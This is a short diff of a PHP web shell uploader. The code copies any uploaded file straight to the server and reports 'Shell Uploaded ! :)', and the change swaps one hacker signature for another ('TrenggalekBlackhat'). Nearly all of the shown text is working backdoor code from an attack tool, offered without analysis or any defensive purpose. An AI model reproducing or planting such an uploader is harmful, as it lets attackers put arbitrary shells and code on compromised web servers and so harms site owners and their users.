@@ -7,7 +7,7 @@ if( $_POST['_upl'] == "Upload" ) {
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
 else { echo '<b>Not uploaded ! </b><br><br>'; }
 }
-echo '<i>-Wong Galek-</i>';
+echo '<i>TrenggalekBlackhat</i>';
 ?>
 <?php
 @ini_set('output_buffering', 0);
